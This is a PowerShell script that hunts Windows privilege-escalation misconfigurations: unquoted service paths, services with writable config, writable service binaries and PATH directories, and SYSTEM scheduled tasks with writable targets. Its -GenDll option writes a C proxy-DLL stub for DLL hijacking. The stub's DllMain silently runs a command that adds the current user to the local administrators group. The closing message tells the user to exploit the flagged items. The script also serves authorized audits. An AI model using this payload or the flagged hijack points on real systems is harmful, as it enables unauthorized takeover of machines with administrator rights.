<#
.SYNOPSIS
    service_hijack_audit.ps1 - Hunt Windows service / DLL / scheduled-task privesc misconfigs.

    Enumerates and ranks: (1) unquoted service paths with writable injection points,
    (2) services whose config is writable by low-priv principals (SERVICE_CHANGE_CONFIG via SDDL),
    (3) writable service binaries/directories, (4) writable %PATH% dirs (phantom-DLL candidates),
    (5) scheduled tasks running as SYSTEM/admin with a writable target binary.
    -GenDll writes a proxy-DLL C stub for a chosen export set.

.USAGE
    powershell -ep bypass -File service_hijack_audit.ps1
    powershell -ep bypass -File service_hijack_audit.ps1 -GenDll hostfxr -Out C:\Windows\Tasks\hostfxr.c

.NOTES
    Read-only audit (no config changes). Pure PowerShell. Run as the low-priv user you want to assess.
    OPSEC: read-only but queries every service/task; surfaces the writable points an attacker would use.
#>
[CmdletBinding()]
param([string]$GenDll, [string]$Out = ".\proxy.c")

$ErrorActionPreference = 'SilentlyContinue'
function H($t){ Write-Host "`n==== $t ====" -ForegroundColor Cyan }
function Hot($t){ Write-Host "  [!] $t" -ForegroundColor Yellow }

# principals we treat as "low-priv / attacker-controllable"
$lowPriv = 'Everyone|Authenticated Users|BUILTIN\\Users|NT AUTHORITY\\INTERACTIVE|S-1-5-11|S-1-1-0'

function Test-Writable([string]$path){
    if(-not (Test-Path $path)){ return $false }
    try{
        $acl = Get-Acl $path
        foreach($ace in $acl.Access){
            if($ace.AccessControlType -eq 'Allow' -and
               $ace.IdentityReference -match $lowPriv -and
               $ace.FileSystemRights -match 'Write|Modify|FullControl|WriteData|CreateFiles'){
                return $true
            }
        }
    } catch {}
    return $false
}

if($GenDll){
    # Emit a proxy-DLL stub: payload in DllMain + forwarders keep the host app stable.
    $c = @"
// Proxy DLL stub for phantom/search-order hijack of $GenDll.dll
// Build: x86_64-w64-mingw32-gcc -shared -o $GenDll.dll $([IO.Path]::GetFileName($Out)) -Wl,--enable-stdcall-fixup
// Forward real exports to the genuine DLL so the host process keeps working, e.g.:
//   #pragma comment(linker, "/export:SomeFunc=C:\\real\\$GenDll.SomeFunc")
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r){
    if (reason == DLL_PROCESS_ATTACH){
        // Payload runs in the host (often SYSTEM) context. Replace as needed.
        WinExec("cmd.exe /c net localgroup administrators %USERNAME% /add", SW_HIDE);
    }
    return TRUE;
}
"@
    Set-Content -Path $Out -Value $c -Encoding ASCII
    Write-Host "[+] Proxy-DLL stub written to $Out (add /export forwarders for the real exports)" -ForegroundColor Green
    return
}

H "UNQUOTED SERVICE PATHS WITH WRITABLE INJECTION POINTS"
foreach($svc in (Get-CimInstance Win32_Service | Where-Object { $_.PathName })){
    $pn = $svc.PathName
    if($pn -notmatch '^\s*"' -and $pn -match ' ' -and $pn -notmatch '(?i)^[A-Z]:\\Windows'){
        # build candidate injection dirs from each space in the exe portion
        $exe = ($pn -split '\.exe')[0] + '.exe'
        $parts = $exe -split ' '
        $accum = ''
        $hit = $false
        foreach($p in $parts[0..($parts.Count-2)]){
            $accum = if($accum){ "$accum $p" } else { $p }
            $dir = Split-Path $accum -Parent
            if($dir -and (Test-Writable $dir)){
                Hot "$($svc.Name): drop '$([IO.Path]::GetFileName($accum)).exe' in writable '$dir'  [$($svc.StartMode)]"
                $hit = $true
            }
        }
        if(-not $hit){ Write-Host "  (unquoted, no writable injection point) $($svc.Name) -> $pn" }
    }
}

H "SERVICES WITH WRITABLE CONFIG (SERVICE_CHANGE_CONFIG for low-priv)"
foreach($svc in (Get-CimInstance Win32_Service)){
    $sd = & sc.exe sdshow $svc.Name 2>$null
    if($sd){
        # Look for an Allow ACE granting CC/DC/WP/LO/RP (change-config family) to AU/WD/IU/BU
        if($sd -match 'A;;[A-Z]*(?:CC|DC|WP|RP|LO|SD|WD)[A-Z]*;;;(AU|WD|IU|BU|S-1-1-0|S-1-5-11)'){
            Hot "$($svc.Name): SDDL allows config change by low-priv -> $sd"
        }
    }
}

H "WRITABLE SERVICE BINARIES"
foreach($svc in (Get-CimInstance Win32_Service | Where-Object PathName)){
    $bin = ($svc.PathName -replace '^\s*"?([^"]+\.exe).*$','$1').Trim('"')
    if(Test-Writable $bin){ Hot "$($svc.Name): binary writable -> $bin" }
    else {
        $dir = Split-Path $bin -Parent
        if($dir -and (Test-Writable $dir)){ Hot "$($svc.Name): binary DIR writable -> $dir" }
    }
}

H "WRITABLE %PATH% DIRECTORIES (phantom DLL candidates)"
$env:PATH -split ';' | Where-Object { $_ } | Select-Object -Unique | ForEach-Object {
    if(Test-Writable $_){ Hot "writable PATH dir: $_  (drop a phantom DLL a SYSTEM proc loads)" }
}

H "SCHEDULED TASKS (SYSTEM/admin) WITH WRITABLE TARGET BINARY"
foreach($t in (Get-ScheduledTask | Where-Object { $_.Principal.UserId -match 'SYSTEM|Administrator' -and $_.State -ne 'Disabled' })){
    foreach($a in $t.Actions){
        $exe = $a.Execute
        if($exe){
            $exe = [Environment]::ExpandEnvironmentVariables($exe).Trim('"')
            if((Test-Path $exe) -and (Test-Writable $exe)){
                Hot "$($t.TaskName): writable target '$exe' runs as $($t.Principal.UserId)"
            }
        }
    }
}

Write-Host "`n[*] Audit complete. Exploit highlighted [!] items per service-dll-hijacking.md." -ForegroundColor Cyan
Write-Host "    Generate a proxy-DLL stub: -GenDll <name> -Out <file.c>" -ForegroundColor DarkCyan
